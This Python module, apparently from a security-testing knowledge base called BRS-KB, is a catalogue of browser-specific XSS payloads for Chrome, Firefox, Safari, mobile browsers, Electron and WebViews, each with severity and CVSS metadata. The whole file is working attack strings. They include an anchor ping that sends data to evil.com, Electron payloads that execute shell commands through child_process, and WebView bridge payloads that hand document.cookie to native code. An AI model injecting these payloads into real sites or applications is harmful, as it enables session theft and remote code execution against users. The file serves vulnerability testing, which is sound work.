#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created

Browser-Specific XSS Payloads
"""

from ..models import PayloadEntry


BROWSER_SPECIFIC_DATABASE = {
    # ===== CHROME SPECIFIC =====
    "chrome_001": PayloadEntry(
        payload='<a ping="https://evil.com" href="#">click</a>',
        contexts=["html_content"],
        tags=["chrome", "ping", "tracking"],
        severity="medium",
        cvss_score=5.0,
        description="Chrome ping attribute for data exfil",
        reliability="high",
        browser_support=["chrome"],
    ),
    "chrome_002": PayloadEntry(
        payload="<div popover id=x>XSS</div><button popovertarget=x onclick=alert(1)>",
        contexts=["html_content"],
        tags=["chrome", "popover"],
        severity="high",
        cvss_score=7.5,
        description="Chrome popover API XSS",
        reliability="medium",
        browser_support=["chrome"],
    ),
    # ===== FIREFOX SPECIFIC =====
    "firefox_001": PayloadEntry(
        payload="<x onclick=alert(1)>click",
        contexts=["html_content"],
        tags=["firefox", "custom_element"],
        severity="high",
        cvss_score=7.5,
        description="Firefox custom element XSS",
        reliability="high",
        browser_support=["firefox"],
    ),
    "firefox_002": PayloadEntry(
        payload='<math><mrow xlink:type="simple" xlink:href="javascript:alert(1)">click</mrow></math>',
        contexts=["html_content", "mathml"],
        tags=["firefox", "mathml", "xlink"],
        severity="high",
        cvss_score=7.5,
        description="Firefox MathML xlink XSS",
        reliability="medium",
        browser_support=["firefox"],
    ),
    # ===== SAFARI SPECIFIC =====
    "safari_001": PayloadEntry(
        payload='<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>',
        contexts=["html_content", "css"],
        tags=["safari", "animation", "webkit"],
        severity="high",
        cvss_score=7.5,
        description="Safari CSS animation XSS",
        reliability="high",
        browser_support=["safari"],
    ),
    "safari_002": PayloadEntry(
        payload="<img src=x onerror=alert`1`>",
        contexts=["html_content"],
        tags=["safari", "template_literal"],
        severity="high",
        cvss_score=7.5,
        description="Safari template literal in handler",
        reliability="high",
        browser_support=["safari", "chrome", "firefox"],
    ),
    # ===== MOBILE BROWSER SPECIFIC =====
    "mobile_001": PayloadEntry(
        payload="<body ontouchstart=alert(1)>",
        contexts=["html_content"],
        tags=["mobile", "touch"],
        severity="high",
        cvss_score=7.5,
        description="Mobile touch event XSS",
        reliability="high",
        browser_support=["mobile"],
    ),
    "mobile_002": PayloadEntry(
        payload="<div ongesturestart=alert(1)>",
        contexts=["html_content"],
        tags=["mobile", "gesture", "ios"],
        severity="high",
        cvss_score=7.5,
        description="iOS gesture event XSS",
        reliability="medium",
        browser_support=["safari_ios"],
    ),
    # ===== ELECTRON SPECIFIC =====
    "electron_001": PayloadEntry(
        payload='<script>require("child_process").exec("calc")</script>',
        contexts=["javascript"],
        tags=["electron", "rce", "node"],
        severity="critical",
        cvss_score=9.8,
        description="Electron nodeIntegration RCE",
        reliability="medium",
        browser_support=["electron"],
    ),
    "electron_002": PayloadEntry(
        payload="<img src=x onerror=\"require('child_process').exec('id')\">",
        contexts=["html_content"],
        tags=["electron", "rce"],
        severity="critical",
        cvss_score=9.8,
        description="Electron XSS to RCE",
        reliability="medium",
        browser_support=["electron"],
    ),
    # ===== WEBVIEW SPECIFIC =====
    "webview_001": PayloadEntry(
        payload="<script>AndroidInterface.showToast(document.cookie)</script>",
        contexts=["javascript"],
        tags=["android", "webview", "bridge"],
        severity="critical",
        cvss_score=9.0,
        description="Android WebView JavaScript bridge abuse",
        reliability="medium",
        browser_support=["android_webview"],
    ),
    "webview_002": PayloadEntry(
        payload="<script>webkit.messageHandlers.callback.postMessage(document.cookie)</script>",
        contexts=["javascript"],
        tags=["ios", "wkwebview", "bridge"],
        severity="critical",
        cvss_score=9.0,
        description="iOS WKWebView message handler abuse",
        reliability="medium",
        browser_support=["ios_wkwebview"],
    ),
}

BROWSER_SPECIFIC_TOTAL = len(BROWSER_SPECIFIC_DATABASE)
